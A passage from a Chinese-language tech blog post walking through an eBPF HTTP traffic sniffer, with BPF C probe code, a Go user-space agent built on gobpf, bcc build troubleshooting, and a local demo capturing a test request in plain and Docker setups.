class="line"></span><br><span class="line">    <span class="comment">// 系统调用的返回码也是读取的字节数。</span></span><br><span class="line">    <span class="keyword">ssize_t</span> bytes_count = PT_REGS_RC(ctx); </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_args_t</span>* <span class="title">read_args</span> = <span class="title">active_read_args_map</span>.<span class="title">lookup</span>(&amp;<span class="title">id</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (read_args != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// kIngress 是一个枚举值，让 process_data函数知道输入缓冲区是传入还是传出。</span></span><br><span class="line">        process_data(ctx, id, kIngress, read_args, bytes_count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后清理map</span></span><br><span class="line">    active_read_args_map.<span class="keyword">delete</span>(&amp;id);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，我们创建了辅助函数来处理<code>read</code>和<code>write</code>系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数据缓冲区消息大小，BPF最多可以将这个数量的数据提交到perf缓冲区。</span></span><br><span class="line"><span class="comment">//内核大小限制为32kb</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MSG_SIZE 30720  <span class="comment">// 30KiB</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_data_event_t</span> &#123;</span></span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">attr_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// 系统调用完成时的时间戳</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接标识符 (PID, FD, etc.).</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// msg 字段编码的实际数据的类型，调用者使用它来确定如何解释数据。</span></span><br><span class="line">    <span class="keyword">enum</span> <span class="keyword">traffic_direction_t</span> direction;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原始消息的大小。我们使用它来截断 msg 字段以最小化正在传输的数据量。</span></span><br><span class="line">    <span class="keyword">uint32_t</span> msg_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接上此事件的从 0 开始的位置编号，以字节位置表示。</span></span><br><span class="line">    <span class="comment">// 该位置是该消息的第一个字节。</span></span><br><span class="line">    <span class="keyword">uint64_t</span> pos;</span><br><span class="line">  &#125; attr;</span><br><span class="line">  <span class="keyword">char</span> msg[MAX_MSG_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perf缓冲区向用户模式代理发送数据事件</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_data_events);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理读/写系统调用的辅助函数</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> __attribute__((__always_inline__)) <span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                   <span class="keyword">enum</span> <span class="keyword">traffic_direction_t</span> direction,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                   <span class="keyword">const</span> struct <span class="keyword">data_args_t</span>* args, <span class="keyword">ssize_t</span> bytes_count)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在访问指针之前始终检查对指针的访问</span></span><br><span class="line">    <span class="keyword">if</span> (args-&gt;buf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对于 read 和 write 系统调用，返回码是写入或读取的字节数，因此零表示没有写入或读取任何内容，负数表示系统调用失败。</span></span><br><span class="line">    <span class="keyword">if</span> (bytes_count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)args-&gt;fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span>* <span class="title">conn_info</span> = <span class="title">conn_info_map</span>.<span class="title">lookup</span>(&amp;<span class="title">pid_fd</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (conn_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 正在读/写的fd不代表IPV4套接字fd</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查连接是否已经是HTTP或者检查是否是新连接，如果是HTTP，则返回true</span></span><br><span class="line">    <span class="keyword">if</span> (is_http_connection(conn_info, args-&gt;buf, bytes_count)) &#123;</span><br><span class="line">        <span class="comment">// 分配新事件</span></span><br><span class="line">        <span class="keyword">uint32_t</span> kZero = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket_data_event_t</span>* <span class="title">event</span> = <span class="title">socket_data_event_buffer_heap</span>.<span class="title">lookup</span>(&amp;<span class="title">kZero</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (event == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 填充数据事件的元数据</span></span><br><span class="line">        event-&gt;attr.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">        event-&gt;attr.direction = direction;</span><br><span class="line">        event-&gt;attr.conn_id = conn_info-&gt;conn_id;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 另一个辅助函数，如果给定缓冲区大小，则将其拆分为块</span></span><br><span class="line">        perf_submit_wrapper(ctx, direction, args-&gt;buf, bytes_count, conn_info, event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新conn_info总写入/读取的字节数</span></span><br><span class="line"><span class="keyword">switch</span> (direction) &#123;</span><br><span class="line">        <span class="keyword">case</span> kEgress:</span><br><span class="line">            conn_info-&gt;wr_bytes += bytes_count;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> kIngress:</span><br><span class="line">            conn_info-&gt;rd_bytes += bytes_count;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可以看到，我们的辅助函数会检查<code>read</code>或者<code>write</code>系统调用是否成功完成。通过检查 读取（写入）字节，检查正在读取（或写入）的数据是否为HTTP。如果是，则发送它到用户模式代理并作为一个事件。</p><p>然后会快速转到write系统调用。</p><p>最后代码处理close事件。在下面的代码中，我们创建了辅助函数来处理close系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//发送到用户模式代理的关闭事件的结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_close_event_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// close系统调用的时间戳</span></span><br><span class="line">    <span class="keyword">uint64_t</span> timestamp_ns;</span><br><span class="line">    <span class="comment">// 连接的唯一id</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line">    <span class="comment">// 在该连接上写入的总字节数</span></span><br><span class="line">    <span class="keyword">int64_t</span> wr_bytes;</span><br><span class="line">    <span class="comment">// 在该连接上读取的总字节数</span></span><br><span class="line">    <span class="keyword">int64_t</span> rd_bytes;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perf缓冲区向用户模式代理发送close事件</span></span><br><span class="line">BPF_PERF_OUTPUT(socket_close_events);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> __attribute__((__always_inline__)) <span class="function"><span class="keyword">void</span> <span class="title">process_syscall_close</span><span class="params">(struct pt_regs* ctx, <span class="keyword">uint64_t</span> id,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                                            <span class="keyword">const</span> struct <span class="keyword">close_args_t</span>* close_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret_val = PT_REGS_RC(ctx);</span><br><span class="line">    <span class="comment">// 如果系统调用失败，直接return</span></span><br><span class="line">    <span class="keyword">if</span> (ret_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> pid = id &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pid_fd = ((<span class="keyword">uint64_t</span>)pid &lt;&lt; <span class="number">32</span>) | (<span class="keyword">uint32_t</span>)close_args-&gt;fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span>* <span class="title">conn_info</span> = <span class="title">conn_info_map</span>.<span class="title">lookup</span>(&amp;<span class="title">pid_fd</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (conn_info == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 正在关闭的fd，并不代表IPV4套接字fd</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向用户模式代理发送一个指示连接已关闭的事件</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket_close_event_t</span> <span class="title">close_event</span> = &#123;</span>&#125;;</span><br><span class="line">    close_event.timestamp_ns = bpf_ktime_get_ns();</span><br><span class="line">    close_event.conn_id = conn_info-&gt;conn_id;</span><br><span class="line">    close_event.rd_bytes = conn_info-&gt;rd_bytes;</span><br><span class="line">    close_event.wr_bytes = conn_info-&gt;wr_bytes;</span><br><span class="line"></span><br><span class="line">    socket_close_events.perf_submit(ctx, &amp;close_event, <span class="keyword">sizeof</span>(struct <span class="keyword">socket_close_event_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从映射中删除连接</span></span><br><span class="line">    conn_info_map.<span class="keyword">delete</span>(&amp;pid_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="用户代理Go实现"><a href="#用户代理Go实现" class="headerlink" title="用户代理Go实现"></a>用户代理Go实现</h4><p>用户模式代理使用gobpf库编写。第一步是编译代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bpfModule := bcc.NewModule(<span class="keyword">string</span>(bpfSourceCodeContent), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">defer</span> bpfModule.Close()</span><br></pre></td></tr></table></figure><p>然后创建一个连接工厂，负责保存所有连接实例并打印就绪连接并删除不活动或格式错误的连接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建连接工厂并将 1分钟设置为不活动阈值，这意味着在最后一分钟内未收到任何事件的连接将被关闭。</span></span><br><span class="line">connectionFactory := connections.NewFactory(time.Minute)</span><br><span class="line"><span class="comment">// 启动一个goroutine。每 10 秒运行一次并打印就绪连接并删除非活动或格式错误的连接。</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">connectionFactory.HandleReadyConnections()</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>加载 perf 缓冲区处理程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bpfwrapper.LaunchPerfBufferConsumers(bpfModule, connectionFactory); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panic(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是关于单用户模式perf缓冲区处理程序的说明。</p><p>每个处理程序通过管道(inputChan)获取事件，并且每个事件的类型为字节数组([]byte)，对于每个事件，我们需要将其转换为go的数据结构表示。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConnID is a conversion of the following C-Struct into GO.</span></span><br><span class="line"><span class="comment">// struct conn_id_t &#123;</span></span><br><span class="line"><span class="comment">//    uint32_t pid;</span></span><br><span class="line"><span class="comment">//    int32_t fd;</span></span><br><span class="line"><span class="comment">//    uint64_t tsid;</span></span><br><span class="line"><span class="comment">// &#125;;.</span></span><br><span class="line"><span class="keyword">type</span> ConnID <span class="keyword">struct</span> &#123;</span><br><span class="line">PID <span class="keyword">uint32</span></span><br><span class="line">FD   <span class="keyword">int32</span></span><br><span class="line">TsID <span class="keyword">uint64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时我们修复了事件的时间戳，因为内核模式返回单调时钟而不是实时时钟，最后，我们使用新事件更新连接对象字段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">socketCloseEventCallback</span><span class="params">(inputChan <span class="keyword">chan</span> []<span class="keyword">byte</span>, connectionFactory *connections.Factory)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> data := <span class="keyword">range</span> inputChan &#123;</span><br><span class="line">      <span class="keyword">if</span> data == <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> event structs.SocketCloseEvent</span><br><span class="line">      <span class="keyword">if</span> err := binary.Read(bytes.NewReader(data), bpf.GetHostByteOrder(), &amp;event); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Printf(<span class="string">"Failed to decode received data: %+v"</span>, err)</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      event.TimestampNano += settings.GetRealTimeOffset()</span><br><span class="line">      connectionFactory.GetOrCreate(event.ConnID).AddCloseEvent(event)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一步是attach到钩子上。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := bpfwrapper.AttachKprobes(bpfModule); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panic(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><h5 id="非docker环境"><a href="#非docker环境" class="headerlink" title="非docker环境"></a>非docker环境</h5><p>bcc工具安装</p><p>Ubuntu - Source</p><p>To build the toolchain from source, one needs:</p><ul><li>LLVM 3.7.1 or newer, compiled with BPF support (default=on)</li><li>Clang, built from the same tree as LLVM</li><li>cmake (&gt;=3.1), gcc (&gt;=4.7), flex, bison</li><li>LuaJIT, if you want Lua support</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="function">For <span class="title">Focal</span> <span class="params">(<span class="number">20.04</span><span class="number">.1</span> LTS)</span></span></span><br><span class="line">sudo apt install -y bison build-essential cmake flex git libedit-dev \</span><br><span class="line">  libllvm12 llvm<span class="number">-12</span>-dev libclang<span class="number">-12</span>-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iovisor/bcc.git</span><br><span class="line">mkdir bcc/build; cd bcc/build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">cmake -DPYTHON_CMD=python3 .. # build python3 binding</span><br><span class="line">pushd src/python/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">popd</span><br></pre></td></tr></table></figure><p>执行报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/capture-traffic# go run main.go ./sourcecode.c</span><br><span class="line"><span class="meta">#</span> github.com/iovisor/gobpf/bcc</span><br><span class="line">/root/go/pkg/mod/github.com/iovisor/gobpf@v0.2.0/bcc/module.go:230:132: not enough arguments in call to (_C2func_bcc_func_load)</span><br><span class="line">have (unsafe.Pointer, _Ctype_int, *_Ctype_char, *_Ctype_struct_bpf_insn, _Ctype_int, *_Ctype_char, _Ctype_uint, _Ctype_int, *_Ctype_char, _Ctype_uint, nil)</span><br><span class="line">want (unsafe.Pointer, _Ctype_int, *_Ctype_char, *_Ctype_struct_bpf_insn, _Ctype_int, *_Ctype_char, _Ctype_uint, _Ctype_int, *_Ctype_char, _Ctype_uint, *_Ctype_char, _Ctype_int)</span><br></pre></td></tr></table></figure><p>最后发现是bcc版本的问题</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -c http.proxy="http://192.168.19.16:17890" -b v0.21.0 https://github.com/iovisor/bcc.git</span><br></pre></td></tr></table></figure><p>启动ebpf sniffer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/capture-traffic# go run main.go ./sourcecode.c</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_accept" for "accept" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_accept" for "accept" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_accept4" for "accept4" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_accept4" for "accept4" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_write" for "write" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_write" for "write" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_read" for "read" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_read" for "read" as 1</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_entry_close" for "close" as 0</span><br><span class="line">2022/09/29 08:19:13 Loading "syscall__probe_ret_close" for "close" as 1</span><br><span class="line">2022/09/29 08:19:13 Sniffer is ready</span><br></pre></td></tr></table></figure><p>启动服务端程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/ebpf-training/workshop1/demo-server# go run main.go</span><br><span class="line">[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.</span><br><span class="line"> - using env:export GIN_MODE=release</span><br><span class="line"> - using code:gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /customResponse           --&gt; main.postCustomResponse (2 handlers)</span><br><span class="line">listening on 0.0.0.0:8080</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span><br><span class="line">[GIN-debug] Listening and serving HTTP on 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>本地发送post请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro [16:19:17] [~]</span><br><span class="line"><span class="meta">-&gt;</span> % curl -X POST http://192.168.19.198:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"9O6aa~!NL1@U66AIh8XLtUWgVynzcXER3hyu6dKFz@LXvQ#n2WkYrn40i5ee2$4@eu$fSwvV1Y4Hkg0zgrtM07BXEMopdzcmUna7"&#125;%</span><br></pre></td></tr></table></figure><p>sniffer查看获取到的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">========================&gt;</span><br><span class="line">Found HTTP payload</span><br><span class="line"><span class="meta">Request-&gt;</span></span><br><span class="line">POST /customResponse HTTP/1.1</span><br><span class="line">Host: 192.168.19.198:8080</span><br><span class="line">User-Agent: curl/7.77.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 13</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&#123;"size": 100&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">Response-&gt;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Date: Thu, 29 Sep 2022 08:19:21 GMT</span><br><span class="line">Content-Length: 113</span><br><span class="line"></span><br><span class="line">&#123;"answer":"9O6aa~!NL1@U66AIh8XLtUWgVynzcXER3hyu6dKFz@LXvQ#n2WkYrn40i5ee2$4@eu$fSwvV1Y4Hkg0zgrtM07BXEMopdzcmUna7"&#125;</span><br><span class="line"></span><br><span class="line">&lt;========================</span><br></pre></td></tr></table></figure><h5 id="docker环境"><a href="#docker环境" class="headerlink" title="docker环境"></a>docker环境</h5><p>docker镜像打包，<code>Dockfile</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FROM golang:1.16-bullseye as builder</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line"></span><br><span class="line"># According to https://packages.debian.org/source/sid/bpfcc,</span><br><span class="line"># BCC build dependencies:</span><br><span class="line">RUN apt-get install -y arping bison clang-format cmake dh-python \</span><br><span class="line">  dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \</span><br><span class="line">  libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \</span><br><span class="line">  libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \</span><br><span class="line">  luajit python3-netaddr python3-pyroute2 python3-distutils python3 git</span><br><span class="line">ENV http_proxy http://192.168.19.16:17890</span><br><span class="line">ENV https_proxy http://192.168.19.16:17890</span><br><span class="line"># Install and compile BCC</span><br><span class="line">RUN git clone https://github.com/iovisor/bcc.git</span><br><span class="line">ENV http_proxy &apos;&apos;</span><br><span class="line">ENV https_proxy &apos;&apos;</span><br><span class="line">RUN mkdir bcc/build</span><br><span class="line">WORKDIR bcc/build</span><br><span class="line">RUN cmake ..</span><br><span class="line">RUN make</span><br><span class="line">RUN make install</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t sniffer:v1</span><br></pre></td></tr></table></figure><p>docker启动，<code>setup_docker.sh</code>如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line"></span><br><span class="line">ROOT_DIR=$(dirname $(dirname $(realpath "$&#123;0&#125;")))</span><br><span class="line">docker run --privileged --net=host -v $&#123;ROOT_DIR&#125;:/src -w /src/workshop1/capture-traffic \</span><br><span class="line">  -v /sys:/sys -v /lib:/lib -v /usr/src:/usr/src -it --rm sniffer:v1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
